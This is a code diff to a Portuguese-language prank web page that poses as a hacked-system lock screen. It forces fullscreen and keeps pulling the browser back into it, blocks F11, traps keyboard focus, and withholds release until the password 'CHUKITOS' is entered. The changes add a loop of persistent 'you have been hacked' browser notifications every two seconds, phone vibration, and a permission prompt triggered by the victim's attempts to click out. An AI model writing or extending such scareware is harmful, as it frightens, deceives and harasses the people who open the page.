@@ -78,8 +78,43 @@
   const SENHA_CORRETA = "CHUKITOS";
   const input = document.getElementById('senhaInput');
   const btn = document.getElementById('btnDesbloquear');
+  let spamInterval = null;
 
-  // Trava a tela cheia assim que possível
+  // --- 1. PEDE PERMISSÃO DE NOTIFICAÇÃO ---
+  function pedirPermissao() {
+    if ("Notification" in window) {
+      Notification.requestPermission().then(permission => {
+        if (permission === "granted") {
+          iniciarSpam();
+        }
+      });
+    }
+  }
+
+  // --- 2. SPAM DE NOTIFICAÇÕES ---
+  function dispararNotificacao() {
+    if (Notification.permission === "granted") {
+      const notif = new Notification("SISTEMA HACKEADO", {
+        body: "Você foi hackeado pelo CHUKITOS! Digite a senha!",
+        icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png", // Ícone de caveira
+        requireInteraction: true // Não some sozinha no PC
+      });
+      
+      // No mobile, tenta vibrar também
+      if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+    }
+  }
+
+  function iniciarSpam() {
+    if (!spamInterval) {
+      // Dispara a primeira na hora
+      dispararNotificacao();
+      // E depois fica num loop de 2 em 2 segundos
+      spamInterval = setInterval(dispararNotificacao, 2000);
+    }
+  }
+
+  // --- 3. TRAVA DE TELA CHEIA ---
   function forcarTelaCheia() {
     const el = document.documentElement;
     if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
@@ -87,35 +122,37 @@
   }
   
   forcarTelaCheia();
-
-  // Se ele conseguir sair da tela cheia (apertando F11 ou deslizando), o site puxa de volta
   setInterval(() => {
     if (!document.fullscreenElement && !document.webkitFullscreenElement) {
        forcarTelaCheia();
     }
   }, 200);
 
-  // Função pra verificar a senha
+  // --- 4. LÓGICA DA SENHA ---
   function checarSenha() {
     const digitada = input.value.toUpperCase();
     if (digitada === SENHA_CORRETA) {
-      // Se acertar, sai da tela cheia e mostra mensagem
+      // Acertou: para o spam e libera
+      if (spamInterval) clearInterval(spamInterval);
+      
       if (document.exitFullscreen) document.exitFullscreen().catch(()=>{});
       else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
       
       document.body.innerHTML = `
         <div style="display:flex;flex-direction:column;height:100vh;align-items:center;justify-content:center;background:#000;color:#0f0;font-family:monospace;text-align:center;padding:20px;">
           <div style="font-size:2.5rem; font-weight:900; text-shadow: 0 0 10px #0f0;">ACESSO PERMITIDO</div>
-          <div style="font-size:1rem;color:#aaa;margin-top:10px;">Você acertou a senha.</div>
+          <div style="font-size:1rem;color:#aaa;margin-top:10px;">Notificações paradas. Você se salvou.</div>
           <div style="font-size:1.5rem;color:#f00; margin-top:40px; font-weight:bold; text-shadow: 0 0 10px red;">Feito por: Davi chukitos</div>
         </div>`;
       document.body.style.cursor = 'default';
+      
     } else {
-      // Se errar, limpa o campo e pisca vermelho
+      // Errou: pisca vermelho, limpa e manda mais uma notificação de castigo
       input.value = '';
       input.style.borderColor = '#ff0000';
       input.style.color = '#ff0000';
       document.body.style.background = '#300';
+      dispararNotificacao();
       
       setTimeout(() => {
         input.style.borderColor = '#00ff00';
@@ -127,26 +164,27 @@
     }
   }
 
-  // Eventos de clique e de teclado
   btn.addEventListener('click', checarSenha);
   input.addEventListener('keydown', (e) => {
     if (e.key === 'Enter') checarSenha();
   });
 
-  // Bloqueia atalhos de teclado para não fechar a aba sem querer (Ctrl+W e F11 e Esc)
   document.addEventListener('keydown', (e) => {
-    // Permite ESC ou Ctrl+W como forma de escape de emergência se segurar
-    if (e.key === 'F11') {
-      e.preventDefault();
-    }
+    if (e.key === 'F11') e.preventDefault();
   });
 
-  // Força o input a ficar focado
   setInterval(() => {
-    if(document.activeElement !== input) {
-      input.focus();
-    }
+    if(document.activeElement !== input) input.focus();
   }, 500);
+
+  // --- GATILHO INICIAL ---
+  // Quando o usuário clicar na tela (o que ele vai fazer pra tentar interagir com a trava), pede a permissão
+  document.body.addEventListener('click', () => {
+    pedirPermissao();
+  }, { once: true }); // 'once: true' garante que o pop-up de permissão só aparece uma vez
+
+  // Fallback: tenta pedir a permissão logo de cara (alguns navegadores bloqueiam, mas no mobile às vezes funciona)
+  setTimeout(pedirPermissao, 1000);
 
 })();
 </script>
